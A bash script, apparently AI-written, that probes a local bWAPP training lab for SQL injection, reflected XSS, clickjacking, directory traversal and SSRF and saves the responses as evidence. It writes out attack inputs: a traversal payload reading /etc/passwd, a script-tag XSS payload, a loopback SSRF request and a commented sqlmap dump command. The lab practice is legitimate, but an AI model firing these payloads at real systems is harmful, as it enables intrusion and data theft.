#!/usr/bin/env bash
set -eu
# Detect a few more vulnerabilities automatically (quick PoC + save evidence)
# Usage: ./detect-more-vuls.sh
# Run from Kali VM. Adjust BASE and RSYNC_TARGET as needed.

BASE="http://127.0.0.1:8080"   # change if your bWAPP is elsewhere
PROOFS_BASE=~/vapt/itsecgames.com/proofs/step2/detected_vulnerabilities
RSYNC_TARGET="/media/sf_ITSecGames/itsecgames.com/proofs/detected_vulnerabilities/"  # windows share
COOKIES="${PWD}/cookies.txt"   # use your cookie jar used for authenticated sessions

mkdir -p "$PROOFS_BASE"
now() { date -u +"%Y%m%d_%H%M%S"; }

log() { echo -e "\n--- $* ---"; }

# helper: fetch portal for a bug id and store HTML
select_bug() {
  local BUG="$1" OUT="$2"
  curl -s -b "$COOKIES" -d "bug=${BUG}&form_bug=submit" -L "${BASE}/portal.php" -o "$OUT"
}

# helper: fetch raw root headers
save_root_headers() {
  local out="$1"
  curl -s -I "$BASE/" > "$out" || true
}

# 1) Blind SQLi quick-check (boolean/time based)
log "1) Quick check: SQLi blind (boolean/time) - bug ids vary; we'll hit the general SQLi page and run sqlmap on it if present"
TS="$(now)"
DIR="$PROOFS_BASE/sqli_blind_${TS}"
mkdir -p "$DIR"
# open portal to select typical SQLi GET (13) - adjust if your instance different
select_bug 13 "$DIR/sqli_get_page.html" || true
# Try finding an obvious parameter in the page
grep -niE "name=\".*(id|search|q|target|page)\"" "$DIR/sqli_get_page.html" || true
# If you already have a target param (example below uses target=get parameter 'page'), run sqlmap:
# sqlmap -u "http://127.0.0.1:8080/vuln.php?id=1" --batch --level 2 --risk 1 --threads 4 -o --dump
# Save note
cat > "$DIR/proof_sqlibln.txt" <<EOF
SQLi quick-check executed on $TS
- Page saved: sqli_get_page.html
- If you find injectable parameter names in the saved page, run sqlmap locally (example commented in script).
EOF

# 2) Reflected XSS (POST) — send a harmless payload and save response
log "2) Reflected XSS (POST) test"
TS="$(now)"
DIR="$PROOFS_BASE/xss_reflected_post_${TS}"
mkdir -p "$DIR"
# select a typical reflected POST bug index (2 or 3 in bWAPP list). We'll POST a benign payload and save result.
select_bug 3 "$DIR/xss_post_page.html" || true
# craft POST payload (payload simple)
curl -s -b "$COOKIES" -d "input=<script>alert('poc')</script>&form=submit" -L "$BASE/some_post_endpoint.php" -o "$DIR/xss_post_response.html" 2>/dev/null || true
# if you don't know endpoint name, inspect xss_post_page.html manually for form action and fields
cat > "$DIR/proof_xss_reflected_post.txt" <<EOF
Reflected XSS POST check on $TS
- Saved form page: xss_post_page.html
- Saved response (if any): xss_post_response.html
- If the payload appears in response unescaped, it's exploitable.
EOF

# 3) Clickjacking check — look for X-Frame-Options header
log "3) Clickjacking (X-Frame-Options / CSP frame-ancestors check)"
TS="$(now)"
DIR="$PROOFS_BASE/clickjacking_headers_${TS}"
mkdir -p "$DIR"
curl -s -D "$DIR/headers_root.txt" -o "$DIR/root_body.html" -I "$BASE/" || true
# record presence/absence
grep -i "X-Frame-Options\|frame-ancestors" "$DIR/headers_root.txt" || true
cat > "$DIR/proof_clickjacking.txt" <<EOF
Clickjacking header check executed on $TS
- Headers: headers_root.txt
- If X-Frame-Options not present and CSP frame-ancestors absent, site likely clickjackable.
EOF

# 4) Directory traversal quick test (attempt to read /etc/passwd via common param if app exposes file fetch)
log "4) Directory traversal quick-check"
TS="$(now)"
DIR="$PROOFS_BASE/dir_traversal_${TS}"
mkdir -p "$DIR"
# Try a few common traversal vectors on a known file-displaying endpoint (example: page=... or file=...)
# We'll try portal variant endpoints as generic test - manual review of returned pages still needed.
for p in "page" "file" "document" "id"; do
  curl -s -b "$COOKIES" -G --data-urlencode "${p}=../../../../etc/passwd" "$BASE/" -o "$DIR/${p}_etc_passwd.html" || true
done
cat > "$DIR/proof_dirtrav.txt" <<EOF
Directory Traversal quick-check $TS
- Saved attempts for parameters: page, file, document, id (see files)
- If /etc/passwd content returned in any file, vuln exists.
EOF

# 5) SSRF quick-check (if SSRF bug exists in the portal list; many labs have bug id ~112)
log "5) SSRF quick-check (server-side request forgery)"
TS="$(now)"
DIR="$PROOFS_BASE/ssrf_${TS}"
mkdir -p "$DIR"
# select SSRF bug id 112 in bWAPP list (adjust if your instance differs)
select_bug 112 "$DIR/ssrf_page.html" || true
# Inspect page for a target param to submit; if action is /ssrf.php and param is url, try a local URL to check behavior:
# We will attempt to hit http://127.0.0.1:8080/ (loopback) or an internal-only endpoint
# Replace 'url' below with the actual parameter name found in ssrf_page.html
curl -s -b "$COOKIES" -L -d "url=http://127.0.0.1:8080&form=submit" "$BASE/ssrf.php" -o "$DIR/ssrf_response_local.html" 2>/dev/null || true
cat > "$DIR/proof_ssrf.txt" <<EOF
SSRF quick-check $TS
- Saved page: ssrf_page.html
- Attempted fetch to internal 127.0.0.1 saved to ssrf_response_local.html
- If server responded with internal content, SSRF present.
EOF

# housekeeping: sync to windows share (so Git on host can commit)
log "Syncing new evidence to Windows share (rsync)"
rsync -avz --progress --human-readable "$PROOFS_BASE/" "$RSYNC_TARGET" || true

log "Done. New evidence folders created under: $PROOFS_BASE"
log "Sync target: $RSYNC_TARGET"

echo -e "\nNext steps (manual):"
echo " - Review each created folder for clear PoC files and craft short proof_*.txt if needed."
echo " - Add screenshots manually where helpful: proofs/screenshots/<vuln>_YYYYMMDD.png"
echo " - On Windows: cd into itsecgames-vapt repo, copy new folders into proofs/detected_vulnerabilities (if not already), then git add/commit/push."
echo " - If you want, I can generate the git commands for the Windows side automatically (tell me 'windows git sync')."

